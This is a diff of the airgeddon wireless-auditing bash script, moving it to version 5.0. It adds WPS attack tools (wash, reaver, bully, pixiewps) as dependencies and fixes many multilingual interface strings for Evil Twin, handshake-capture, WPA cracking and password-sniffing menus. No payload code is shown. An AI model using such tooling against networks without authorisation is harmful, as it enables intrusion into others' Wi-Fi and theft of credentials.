@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="4.32"
+airgeddon_version="5.0"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -60,23 +60,18 @@ optional_tools_names=(
 						"sslstrip"
 						"lighttpd"
 						"dnsspoof"
+						"wash"
+						"reaver"
+						"bully"
+						"pixiewps"
 					)
 
-declare -A optional_tools=(
-							[${optional_tools_names[0]}]=0
-							[${optional_tools_names[1]}]=0
-							[${optional_tools_names[2]}]=0
-							[${optional_tools_names[3]}]=0
-							[${optional_tools_names[4]}]=0
-							[${optional_tools_names[5]}]=0
-							[${optional_tools_names[6]}]=0
-							[${optional_tools_names[7]}]=0
-							[${optional_tools_names[8]}]=0
-							[${optional_tools_names[9]}]=0
-							[${optional_tools_names[10]}]=0
-							[${optional_tools_names[11]}]=0
-							[${optional_tools_names[12]}]=0
-						)
+declare -A optional_tools=()
+
+#Initialize optional_tools values
+for item in "${optional_tools_names[@]}"; do
+	optional_tools[${item}]=0
+done
 
 update_tools=("curl")
 
@@ -101,6 +96,10 @@ declare -A possible_package_names=(
 									[${optional_tools_names[10]}]="sslstrip" #sslstrip
 									[${optional_tools_names[11]}]="lighttpd" #lighttpd
 									[${optional_tools_names[12]}]="dsniff" #dnsspoof
+									[${optional_tools_names[13]}]="reaver" #wash
+									[${optional_tools_names[14]}]="reaver" #reaver
+									[${optional_tools_names[15]}]="bully" #bully
+									[${optional_tools_names[16]}]="pixiewps" #pixiewps
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -109,6 +108,8 @@ standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
 osversionfile_dir="/etc/"
 minimum_bash_version_required="4.0"
+minimum_reaver_pixiewps_version="1.5.2"
+minimum_bully_pixiewps_version="1.1"
 resume_message=224
 abort_question=12
 pending_of_translation="[PoT]"
@@ -183,6 +184,7 @@ declare select_interface_hints=(246)
 declare language_hints=(250)
 declare evil_twin_hints=(254 258 264 269 309 328)
 declare evil_twin_dos_hints=(267 268)
+declare wps_hints=(342 343 344 356 369)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -455,13 +457,13 @@ function language_strings() {
 	et_misc_texts["RUSSIAN",24]="Пароль был сохранён в файле"
 	et_misc_texts["GREEK",24]="Ο κωδικός πρόσβασης αποθηκεύτηκε σε αρχείο"
 
-	et_misc_texts["ENGLISH",25]="Press Enter on the main script window to continue, this window will be closed"
-	et_misc_texts["SPANISH",25]="Pulsa Enter en la ventana principal del script para continuar, esta ventana se cerrará"
-	et_misc_texts["FRENCH",25]="Appuyez sur Entrée dans la fenêtre principale du script pour continuer, cette fenêtre se fermera"
-	et_misc_texts["CATALAN",25]="Prem Enter a la finestra principal del script per continuar, aquesta finestra es tancarà"
-	et_misc_texts["PORTUGUESE",25]="Pressione Enter na janela principal do script para continuar e esta janela será fechada"
-	et_misc_texts["RUSSIAN",25]="Нажмите Enter в главном окне для продолжения, это окно будет закрыто"
-	et_misc_texts["GREEK",25]="Πατήστε Enter στο κύριο παράθυρο του script για να συνεχίσετε, το παράθυρο αυτό θα κλείσει"
+	et_misc_texts["ENGLISH",25]="Press [Enter] on the main script window to continue, this window will be closed"
+	et_misc_texts["SPANISH",25]="Pulsa [Enter] en la ventana principal del script para continuar, esta ventana se cerrará"
+	et_misc_texts["FRENCH",25]="Appuyez sur [Entrée] dans la fenêtre principale du script pour continuer, cette fenêtre se fermera"
+	et_misc_texts["CATALAN",25]="Prem [Enter] a la finestra principal del script per continuar, aquesta finestra es tancarà"
+	et_misc_texts["PORTUGUESE",25]="Pressione [Enter] na janela principal do script para continuar e esta janela será fechada"
+	et_misc_texts["RUSSIAN",25]="Нажмите [Enter] в главном окне для продолжения, это окно будет закрыто"
+	et_misc_texts["GREEK",25]="Πατήστε [Enter] στο κύριο παράθυρο του script για να συνεχίσετε, το παράθυρο αυτό θα κλείσει"
 
 	et_misc_texts["ENGLISH",26]="Error. The password must be at least 8 characters. Redirecting to the main screen"
 	et_misc_texts["SPANISH",26]="Error. La contraseña debe tener al menos 8 caracteres. Redirigiendo a la pantalla principal"
@@ -509,7 +511,7 @@ function language_strings() {
 	arr["FRENCH",4]="Pressez [Enter] pour commencer l'attaque..."
 	arr["CATALAN",4]="Premi la tecla [Enter] per començar l'atac..."
 	arr["PORTUGUESE",4]="Pressione [Enter] para iniciar o ataque..."
-	arr["RUSSIAN",4]="Нажмите клавижу [Enter] для начала атаки..."
+	arr["RUSSIAN",4]="Нажмите клавишу [Enter] для начала атаки..."
 	arr["GREEK",4]="Πατήστε [Enter] για να ξεκινήσει η επίθεση..."
 
 	arr["ENGLISH",5]="It looks like your internet connection is unstable. The script can't connect to repository. It will continue without updating..."
@@ -669,7 +671,7 @@ function language_strings() {
 	arr["FRENCH",24]="Sélectionnez l'interface pour travailler :"
 	arr["CATALAN",24]="Seleccionar una interfície per treballar-hi :"
 	arr["PORTUGUESE",24]="Seleccionar uma interface para trabalhar :"
-	arr["RUSSIAN",24]="Выберите интерфейс дял работы :"
+	arr["RUSSIAN",24]="Выберите интерфейс для работы :"
 	arr["GREEK",24]="Επιλέξτε διεπαφή :"
 
 	arr["ENGLISH",25]="Set channel (1-14) :"
@@ -952,21 +954,21 @@ function language_strings() {
 	arr["RUSSIAN",59]="11. Вернуться в главное меню"
 	arr["GREEK",59]="11. Επιστροφή στο αρχικό μενού"
 
-	arr["ENGLISH",60]="8.  About & Credits"
-	arr["SPANISH",60]="8.  Acerca de & Créditos"
-	arr["FRENCH",60]="8.  A propos de & Crédits"
-	arr["CATALAN",60]="8.  Sobre & Crédits"
-	arr["PORTUGUESE",60]="8.  Sobre & Créditos"
-	arr["RUSSIAN",60]="8.  О программе и Благодарности"
-	arr["GREEK",60]="8.  Σχετικά με & Εύσημα"
+	arr["ENGLISH",60]="9.  About & Credits"
+	arr["SPANISH",60]="9.  Acerca de & Créditos"
+	arr["FRENCH",60]="9.  A propos de & Crédits"
+	arr["CATALAN",60]="9.  Sobre & Crédits"
+	arr["PORTUGUESE",60]="9.  Sobre & Créditos"
+	arr["RUSSIAN",60]="9.  О программе и Благодарности"
+	arr["GREEK",60]="9.  Σχετικά με & Εύσημα"
 
-	arr["ENGLISH",61]="10. Exit script"
-	arr["SPANISH",61]="10. Salir del script"
-	arr["FRENCH",61]="10. Sortir du script"
-	arr["CATALAN",61]="10. Sortir del script"
-	arr["PORTUGUESE",61]="10. Sair do script"
-	arr["RUSSIAN",61]="10. Выйти из скрипта"
-	arr["GREEK",61]="10. Έξοδος script"
+	arr["ENGLISH",61]="11. Exit script"
+	arr["SPANISH",61]="11. Salir del script"
+	arr["FRENCH",61]="11. Sortir du script"
+	arr["CATALAN",61]="11. Sortir del script"
+	arr["PORTUGUESE",61]="11. Sair do script"
+	arr["RUSSIAN",61]="11. Выйти из скрипта"
+	arr["GREEK",61]="11. Έξοδος script"
 
 	arr["ENGLISH",62]="8.  Beacon flood attack"
 	arr["SPANISH",62]="8.  Ataque Beacon flood"
@@ -1096,13 +1098,13 @@ function language_strings() {
 	arr["RUSSIAN",77]="Был выбран недействительный интерфейс"
 	arr["GREEK",77]="Επιλέχθηκε άκυρη διεπαφή"
 
-	arr["ENGLISH",78]="9.  Change language"
-	arr["SPANISH",78]="9.  Cambiar idioma"
-	arr["FRENCH",78]="9.  Changer de langue"
-	arr["CATALAN",78]="9.  Canviar l'idioma"
-	arr["PORTUGUESE",78]="9.  Alterar idioma"
-	arr["RUSSIAN",78]="9.  Сменить язык"
-	arr["GREEK",78]="9.  Αλλαγή γλώσσας"
+	arr["ENGLISH",78]="10. Change language"
+	arr["SPANISH",78]="10. Cambiar idioma"
+	arr["FRENCH",78]="10. Changer de langue"
+	arr["CATALAN",78]="10. Canviar l'idioma"
+	arr["PORTUGUESE",78]="10. Alterar idioma"
+	arr["RUSSIAN",78]="10. Сменить язык"
+	arr["GREEK",78]="10. Αλλαγή γλώσσας"
 
 	arr["ENGLISH",79]="1.  English"
 	arr["SPANISH",79]="1.  Inglés"
@@ -1493,7 +1495,7 @@ function language_strings() {
 	arr["FRENCH",127]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
 	arr["CATALAN",127]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Captura Handshake"
 	arr["PORTUGUESE",127]="A ordem normal para esse menu é: 1-Escolha de uma interface wifi 2-colocar interface wifi no modo monitor 3-Selecionar uma rede 4-Capturar Handshake"
-	arr["RUSSIAN",127]="Естественный порядок работы в этом меню: 1-Выбрать wifi карту 2-Перевести её в режим монитора 3-Выбрать целевую сеть 4-Захватить рукопожание"
+	arr["RUSSIAN",127]="Естественный порядок работы в этом меню: 1-Выбрать wifi карту 2-Перевести её в режим монитора 3-Выбрать целевую сеть 4-Захватить рукопожатие"
 	arr["GREEK",127]="Η σειρά εντολών για να προχωρήσετε σε αυτό το μενού είναι συνήθως: 1-Επιλέξτε κάρτα wifi 2-Βάλτε την σε κατάσταση παρακολούθησης 3-Επιλέξτε δίκτυο-στόχος 4-Καταγράψτε την Χειραψία"
 
 	arr["ENGLISH",128]="Select a wifi card to work in order to be able to do more actions than with an ethernet interface"
@@ -1541,7 +1543,7 @@ function language_strings() {
 	arr["FRENCH",133]="Si vous sélectionnez un réseau cible avec un ESSID caché, vous n'allez pas pouvoir utiliser l'ESSID pour attaquer, mais vous pourrez effectuer les attaques basées sur le BSSID du réseau"
 	arr["CATALAN",133]="Si selecciones una xarxa objectiu amb el ESSID ocult, no podràs usar-lo, però pots fer atacs basats en BSSID sobre aquesta xarxa"
 	arr["PORTUGUESE",133]="Se você selecionar uma rede com ESSID oculto, você não pode usá-lo, mas você pode fazer ataques com base no BSSID"
-	arr["RUSSIAN",133]="Если вы выбрали целевую сеть со скрытым ESSID, вы не сможете исопльзовать её, но вы можете выполнить атаку на эту сеть на основе BSSID"
+	arr["RUSSIAN",133]="Если вы выбрали целевую сеть со скрытым ESSID, вы не сможете использовать её, но вы можете выполнить атаку на эту сеть на основе BSSID"
 	arr["GREEK",133]="Αν επιλέξετε ένα δίκτυο-στόχος με κρυφό ESSID, δεν μπορείτε να το χρησιμοποιήσετε, αλλά μπορείτε να εκτελέσετε επιθέσεις BSSID σε αυτό το δίκτυο"
 
 	arr["ENGLISH",134]="If your Linux is a virtual machine, it is possible that integrated wifi cards are detected as ethernet. Use an external usb wifi card"
@@ -1656,20 +1658,20 @@ function language_strings() {
 	arr["RUSSIAN",147]="4.  Возврат в меню инструментов для работы с рукопожатием"
 	arr["GREEK",147]="4.  Επιστροφή στο μενού με τα εργαλεία Χειραψίας"
 
-	arr["ENGLISH",148]="Type the path to store the file or press Enter to accept the default proposal ${normal_color}[${handshakepath}]"
-	arr["SPANISH",148]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto ${normal_color}[${handshakepath}]"
-	arr["FRENCH",148]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour prendre le chemin proposé par défaut ${normal_color}[${handshakepath}]"
-	arr["CATALAN",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte ${normal_color}[${handshakepath}]"
-	arr["PORTUGUESE",148]="Digite o caminho para salvar o arquivo ou pressione Enter para o caminho padrão ${normal_color}[${handshakepath}]"
-	arr["RUSSIAN",148]="Напечатайте путь, по которому сохранить файл или нажмите Enter для принятия предложения по умолчанию ${normal_color}[${handshakepath}]"
-	arr["GREEK",148]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε Enter για την προεπιλεγμένη επιλογή ${normal_color}[${handshakepath}]"
+	arr["ENGLISH",148]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${handshakepath}]"
+	arr["SPANISH",148]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${handshakepath}]"
+	arr["FRENCH",148]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur [Entrée] pour prendre le chemin proposé par défaut ${normal_color}[${handshakepath}]"
+	arr["CATALAN",148]="Escriu la ruta on guardarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${handshakepath}]"
+	arr["PORTUGUESE",148]="Digite o caminho para salvar o arquivo ou pressione [Enter] para o caminho padrão ${normal_color}[${handshakepath}]"
+	arr["RUSSIAN",148]="Напечатайте путь, по которому сохранить файл или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${handshakepath}]"
+	arr["GREEK",148]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${handshakepath}]"
 
 	arr["ENGLISH",149]="Handshake file generated successfully at [${normal_color}${enteredpath}${blue_color}]"
 	arr["SPANISH",149]="Fichero de Handshake generado con éxito en [${normal_color}${enteredpath}${blue_color}]"
 	arr["FRENCH",149]="Fichier Handshake généré avec succès dans [${normal_color}${enteredpath}${blue_color}]"
 	arr["CATALAN",149]="Fitxer de Handshake generat amb èxit a [${normal_color}${enteredpath}${blue_color}]"
 	arr["PORTUGUESE",149]="Arquivo Handshake gerado com sucesso [${normal_color}${enteredpath}${blue_color}]"
-	arr["RUSSIAN",149]="Файл рукопожания успешно сгенерирован в [${normal_color}${enteredpath}${blue_color}]"
+	arr["RUSSIAN",149]="Файл рукопожатия успешно сгенерирован в [${normal_color}${enteredpath}${blue_color}]"
 	arr["GREEK",149]="Το αρχείο Χειραψίας δημιουργήθηκε επιτυχώς στο [${normal_color}${enteredpath}${blue_color}]"
 
 	arr["ENGLISH",150]="No captured Handshake file detected during this session..."
@@ -1829,7 +1831,7 @@ function language_strings() {
 	arr["FRENCH",169]="6.  Menu crack WPA/WPA2 offline"
 	arr["CATALAN",169]="6.  Menú per desxifrar WPA/WPA2 offline"
 	arr["PORTUGUESE",169]="6.  Menu de descriptografia WPA/WPA2 offline"
-	arr["RUSSIAN",169]="6.  Меню оффлайн расшифровки WPA/WPA2"
+	arr["RUSSIAN",169]="6.  Меню офлайн расшифровки WPA/WPA2"
 	arr["GREEK",169]="6.  Μενού offline αποκρυπτογράφησης WPA/WPA2"
 
 	arr["ENGLISH",170]="Offline WPA/WPA2 decrypt menu"
@@ -1837,7 +1839,7 @@ function language_strings() {
 	arr["FRENCH",170]="Menu crack WPA/WPA2 offline"
 	arr["CATALAN",170]="Menú per desxifrar WPA/WPA2 offline"
 	arr["PORTUGUESE",170]="Menu de descriptografia WPA/WPA2 offline"
-	arr["RUSSIAN",170]="Меню оффлайн расшифровки WPA/WPA2"
+	arr["RUSSIAN",170]="Меню офлайн расшифровки WPA/WPA2"
 	arr["GREEK",170]="Μενού offline αποκρυπτογράφησης WPA/WPA2"
 
 	arr["ENGLISH",171]="The key decrypt process is performed offline on a previously captured file"
@@ -1845,7 +1847,7 @@ function language_strings() {
 	arr["FRENCH",171]="Le crack de la clef s'effectue offline en utilisant le fichier capturé antérieurement"
 	arr["CATALAN",171]="El procés de desencriptació de les claus es realitza de manera offline sobre un fitxer capturat prèviament"
 	arr["PORTUGUESE",171]="O processo de descodificação é realizada de modo offline em um arquivo previamente capturado"
-	arr["RUSSIAN",171]="Процесс расшифровки ключа выполняется оффлан на ранее захваченном файле"
+	arr["RUSSIAN",171]="Процесс расшифровки ключа выполняется офлайн на ранее захваченном файле"
 	arr["GREEK",171]="Η διεργασία αποκρυπτογράφησης κλειδιού έχει εκτελεστεί offline σε προηγούμενο αρχείο καταγραφής"
 
 	arr["ENGLISH",172]="1.  (aircrack) Dictionary attack against capture file"
@@ -1901,7 +1903,7 @@ function language_strings() {
 	arr["FRENCH",178]="Pour cracker la clé d'un réseau WPA/WPA2 le fichier de capture doit contenir un Handshake"
 	arr["CATALAN",178]="Per desencriptar la clau d'una xarxa WPA/WPA2 el fitxer de captura ha de contenir un Handshake"
 	arr["PORTUGUESE",178]="Para decifrar a senha de rede WPA/WPA2, o arquivo de captura deve conter um Handshake"
-	arr["RUSSIAN",178]="Для расшифровки ключа сетей WPA/WPA2, the файл захвата должен содержать хендшейк"
+	arr["RUSSIAN",178]="Для расшифровки ключа сетей WPA/WPA2, файл захвата должен содержать четырёхэтапное рукопожатие"
 	arr["GREEK",178]="Για να αποκρυπτογραφήσετε το κλειδί ενός WPA/WPA2 δικτύου, το αρχείο καταγραφής πρέπει να περιέχει μία Χειραψία"
 
 	arr["ENGLISH",179]="Decrypting by bruteforce, it could pass hours, days, weeks or even months to take it depending on the complexity of the password and your processing speed"
@@ -2013,7 +2015,7 @@ function language_strings() {
 	arr["FRENCH",192]="Vous avez déjà sélectionné un BSSID pour la session en cours et est présent dans le fichier de capture ${normal_color}${bssid}${blue_color}]"
 	arr["CATALAN",192]="Ja tens seleccionat un BSSID en aquesta sessió i està present en el fitxer de captura [${normal_color}${bssid}${blue_color}]"
 	arr["PORTUGUESE",192]="Seleccionou um BSSID nesta sessão e está presente no arquivo de captura [${normal_color}${bssid}${blue_color}]"
-	arr["RUSSIAN",192]="У вас уже есть выбранная во время этой сессии BSSID и она пресутствует в файле захвата [${normal_color}${bssid}${blue_color}]"
+	arr["RUSSIAN",192]="У вас уже есть выбранная во время этой сессии BSSID и она присутствует в файле захвата [${normal_color}${bssid}${blue_color}]"
 	arr["GREEK",192]="Έχετε ήδη επιλέξει BSSID κατά τη διάρκεια της συνεδρίας και βρίσκεται στο αρχείο καταγραφής [${normal_color}${bssid}${blue_color}]"
 
 	arr["ENGLISH",193]="Do you want to use this already selected BSSID? ${normal_color}[y/n]"
@@ -2229,7 +2231,7 @@ function language_strings() {
 	arr["FRENCH",219]="Votre système contient les outils fondamentaux nécessaires à l’exécution du script mais il manque quelques outils pour pouvoir utiliser pleinement toutes les fonctionnalités proposées par le script. Le script va pouvoir être exécuté mais il est conseillé d'installer les outils manquants."
 	arr["CATALAN",219]="La teva distro té les eines essencials però li falten algunes opcionals. El script pot continuar però no podràs utilitzar algunes funcionalitats. És recomanable instal·lar les eines que faltin"
 	arr["PORTUGUESE",219]="Sua distro tem as ferramentas essenciais, mas carece de algumas opcionais. O script pode continuar, mas você não pode usar alguns recursos. É aconselhável instalar as ferramentas ausentes"
-	arr["RUSSIAN",219]="Ваш дистрибутив имеет базовые инструмент, но не имеет некоторые опциональные. Скрипт может продолжить, но вы не сможете исопльзовать некоторые функции. Рекомендуется установить отсутствующие инструменты"
+	arr["RUSSIAN",219]="Ваш дистрибутив имеет базовые инструмент, но не имеет некоторые опциональные. Скрипт может продолжить работу, но вы не сможете использовать некоторые функции. Рекомендуется установить отсутствующие инструменты"
 	arr["GREEK",219]="Η διανομή σας έχει τα απαραίτητα εργαλεία αλλά δεν έχει κάποια προαιρετικά. Το script μπορεί να συνεχίσει αλλά δεν θα μπορέσετε να χρησιμοποιήσετε κάποια χαρακτηριστικά. Συνιστάται να εγκαταστήσετε τα λείποντα εργαλεία"
 
 	arr["ENGLISH",220]="Locked menu option was chosen"
@@ -2336,13 +2338,13 @@ function language_strings() {
 	arr["RUSSIAN",232]="5.  (hashcat) Атака на основе правила в отношении захваченного файла"
 	arr["GREEK",232]="5.  (hashcat) Επίθεση κανόνων σε αρχείο καταγραφής"
 
-	arr["ENGLISH",233]="Type the path to store the file or press Enter to accept the default proposal ${normal_color}[${hashcat_potpath}]"
-	arr["SPANISH",233]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto ${normal_color}[${hashcat_potpath}]"
-	arr["FRENCH",233]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé ${normal_color}[${hashcat_potpath}]"
-	arr["CATALAN",233]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte ${normal_color}[${hashcat_potpath}]"
-	arr["PORTUGUESE",233]="Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar o padrão ${normal_color}[${hashcat_potpath}]"
-	arr["RUSSIAN",233]="Напечатайте путь к сохранённому файлу или нажмите Enter для принятия предложения по умолчоанию ${normal_color}[${hashcat_potpath}]"
-	arr["GREEK",233]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε Enter για την προεπιλεγμένη επιλογή ${normal_color}[${hashcat_potpath}]"
+	arr["ENGLISH",233]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${hashcat_potpath}]"
+	arr["SPANISH",233]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${hashcat_potpath}]"
+	arr["FRENCH",233]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${hashcat_potpath}]"
+	arr["CATALAN",233]="Escriu la ruta on guardarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${hashcat_potpath}]"
+	arr["PORTUGUESE",233]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${hashcat_potpath}]"
+	arr["RUSSIAN",233]="Напечатайте путь к сохранённому файлу или нажмите [Enter] для принятия предложения по умолчоанию ${normal_color}[${hashcat_potpath}]"
+	arr["GREEK",233]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${hashcat_potpath}]"
 
 	arr["ENGLISH",234]="Contratulations!! It seems the key has been decrypted"
 	arr["SPANISH",234]="Enhorabuena!! Parece que la clave ha sido desencriptada"
@@ -2445,7 +2447,7 @@ function language_strings() {
 	arr["FRENCH",246]="Chaque fois que vous voyez un texte précédé par ${cyan_color}${pending_of_translation}${pink_color} acronyme de \"Pending of Translation\" cela signifie que la traduction a été faite automatiquement et est en attente de correction"
 	arr["CATALAN",246]="Cada vegada que vegis un text amb el prefix ${cyan_color}${pending_of_translation}${pink_color} acrònim de \"Pending of Translation\", vol dir que la traducció ha estat generada automàticament i encara està pendent de revisió"
 	arr["PORTUGUESE",246]="Cada vez que você vê um texto com o prefixo ${cyan_color}${pending_of_translation}${pink_color} acrônimo para \"Pending of Translation\" significa que a tradução foi gerado automaticamente e ainda está pendente de revisão"
-	arr["RUSSIAN",246]="Каждый раз, когда вы видитте текст с префиксом ${cyan_color}${pending_of_translation}${pink_color} (акроним для \"Ожидает перевода\"), это означает, что перевод был сгенерирован автоматически и ещё ожидает проверки"
+	arr["RUSSIAN",246]="Каждый раз, когда вы видите текст с префиксом ${cyan_color}${pending_of_translation}${pink_color} (акроним для \"Ожидает перевода\"), это означает, что перевод был сгенерирован автоматически и ещё ожидает проверки"
 	arr["GREEK",246]="Κάθε φορά που θα βλέπετε κείμενο με πρόθεμα ${cyan_color}${pending_of_translation}${pink_color} ακρωνύμιο για \"Pending of Translation\", σημαίνει πως η μετάφραση δημιουργήθηκε αυτόματα και αναμένεται κριτική"
 
 	arr["ENGLISH",247]="Despite having all essential tools installed, your system uses airmon-zc instead of airmon-ng. In order to work properly you need to install ethtool and you don't have it right now. Please, install it and launch the script again"
@@ -2840,13 +2842,13 @@ function language_strings() {
 	arr["RUSSIAN",295]="Определение разрешения... Не получается определить!, используется стандартное : ${normal_color}${resolution}"
 	arr["GREEK",295]="Εντοπίζεται η ανάλυση... Δεν μπορεί να εντοπιστεί!, χρησιμοποιείται η προεπιλεγμένη : ${normal_color}${resolution}"
 
-	arr["ENGLISH",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press Enter on this window and the script will automatically close them all"
-	arr["SPANISH",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa Enter en esta ventana y el script cerrará automaticamente todo"
-	arr["FRENCH",296]="Tous les paramètres de l'attaque sont prêts et elle peut comenmcer. Plusieurs consoles vont s'ouvrir, ne les fermez pas. Lorsque vous voulez arrêter l'attaque, appuyez sur Entrée dans cette console et le script fermera automatiquement les autres"
-	arr["CATALAN",296]="Tots els paràmetres i requeriments estan preparats. Començarà l'atac. S'obriran múltiples finestres, no tanquis cap. Quan vulguis parar l'atac prem Enter en aquesta finestra i el script tancarà automàticament tot"
-	arr["PORTUGUESE",296]="Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. Várias janelas iram se abrir, não feche nenhuma delas. Quando quiser parar o ataque pressione Enter nesta janela e o script irá fechar automaticamente"
-	arr["RUSSIAN",296]="Все параметры и требования готовы. Атака может быть начата. Будет открыто много окон, не закрывайте какое-либо. Когда вы захотите остановить атаку, нажмите Enter в этом окне и скрипт автоматически их все закроет"
-	arr["GREEK",296]="Όλοι οι παράμετροι και οι απαιτήσεις έχουν τεθεί. Η επίθεση πρόκειται να ξεκινήσει. Θα ανοίξουν πολλαπλά παράθυρα, μην επιχειρήσετε να κλείσετε κάποιο. Όταν θελήσετε να σταματήσετε την επίθεση πατήστε Enter σε αυτό το παράθυρο και το script θα τα κλείσει όλα"
+	arr["ENGLISH",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press [Enter] on this window and the script will automatically close them all"
+	arr["SPANISH",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa [Enter] en esta ventana y el script cerrará automaticamente todo"
+	arr["FRENCH",296]="Tous les paramètres de l'attaque sont prêts et elle peut comenmcer. Plusieurs consoles vont s'ouvrir, ne les fermez pas. Lorsque vous voulez arrêter l'attaque, appuyez sur [Entrée] dans cette console et le script fermera automatiquement les autres"
+	arr["CATALAN",296]="Tots els paràmetres i requeriments estan preparats. Començarà l'atac. S'obriran múltiples finestres, no tanquis cap. Quan vulguis parar l'atac prem [Enter] en aquesta finestra i el script tancarà automàticament tot"
+	arr["PORTUGUESE",296]="Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. Várias janelas iram se abrir, não feche nenhuma delas. Quando quiser parar o ataque pressione [Enter] nesta janela e o script irá fechar automaticamente"
+	arr["RUSSIAN",296]="Все параметры и требования готовы. Атака может быть начата. Будет открыто много окон, не закрывайте какое-либо. Когда вы захотите остановить атаку, нажмите [Enter] в этом окне и скрипт автоматически их все закроет"
+	arr["GREEK",296]="Όλοι οι παράμετροι και οι απαιτήσεις έχουν τεθεί. Η επίθεση πρόκειται να ξεκινήσει. Θα ανοίξουν πολλαπλά παράθυρα, μην επιχειρήσετε να κλείσετε κάποιο. Όταν θελήσετε να σταματήσετε την επίθεση πατήστε [Enter] σε αυτό το παράθυρο και το script θα τα κλείσει όλα"
 
 	arr["ENGLISH",297]="Cleaning iptables and routing rules"
 	arr["SPANISH",297]="Limpiando iptables y reglas de routing"
@@ -2856,13 +2858,13 @@ function language_strings() {
 	arr["RUSSIAN",297]="Очистка iptables и правило маршрутизации"
 	arr["GREEK",297]="Γινεται καθαρισμός των iptables και των κανόνων δρομολόγησης"
 
-	arr["ENGLISH",298]="Evil Twin attack has been started. Press Enter key on this window to stop it"
-	arr["SPANISH",298]="El ataque Evil Twin ha comenzado. Pulse la tecla Enter en esta ventana para pararlo"
-	arr["FRENCH",298]="L'attaque Evil Twin a commencé. Pressez la touche Entrée dans cette console pour l'arrêter"
-	arr["CATALAN",298]="L'atac Evil Twin ha començat. Prem Enter a aquesta finestra per aturar-lo"
-	arr["PORTUGUESE",298]="Ataque Evil Twin iniciado. Pressione a tecla Enter nesta janela para parar"
-	arr["RUSSIAN",298]="Атака Злой Двойник начата. Для её остановки клавишу Enter в этом окне"
-	arr["GREEK",298]="Η επίθεση Evil Twin ξεκίνησε. Πατήστε το κουμπί Enter σε αυτό το παράθυρο για να την σταματήσετε"
+	arr["ENGLISH",298]="Evil Twin attack has been started. Press [Enter] key on this window to stop it"
+	arr["SPANISH",298]="El ataque Evil Twin ha comenzado. Pulse la tecla [Enter] en esta ventana para pararlo"
+	arr["FRENCH",298]="L'attaque Evil Twin a commencé. Pressez la touche [Entrée] dans cette console pour l'arrêter"
+	arr["CATALAN",298]="L'atac Evil Twin ha començat. Prem [Enter] a aquesta finestra per aturar-lo"
+	arr["PORTUGUESE",298]="Ataque Evil Twin iniciado. Pressione a tecla [Enter] nesta janela para parar"
+	arr["RUSSIAN",298]="Атака Злой Двойник начата. Для её остановки клавишу [Enter] в этом окне"
+	arr["GREEK",298]="Η επίθεση Evil Twin ξεκίνησε. Πατήστε το κουμπί [Enter] σε αυτό το παράθυρο για να την σταματήσετε"
 
 	arr["ENGLISH",299]="Restoring interface..."
 	arr["SPANISH",299]="Restaurando interfaz..."
@@ -2896,13 +2898,13 @@ function language_strings() {
 	arr["RUSSIAN",302]="Вы хотите сохранить в файл захваченные сниффингом пароли? ${blue_color}Если ваш ответ нет (\"n\") они будут только показаны на экране ${normal_color}[y/n]"
 	arr["GREEK",302]="Θέλετε να αποθηκεύσετε σε ένα αρχείο τους sniffed κωδικούς πρόσβασης; ${blue_color}Αν απαντήσετε όχι (\"n\") απλά θα εμφανιστούν στην οθόνη ${normal_color}[y/n]"
 
-	arr["ENGLISH",303]="Type the path to store the file or press Enter to accept the default proposal ${normal_color}[${default_ettercap_logpath}]"
-	arr["SPANISH",303]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto ${normal_color}[${default_ettercap_logpath}]"
-	arr["FRENCH",303]="Entrez le chemin du fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé ${normal_color}[${default_ettercap_logpath}]"
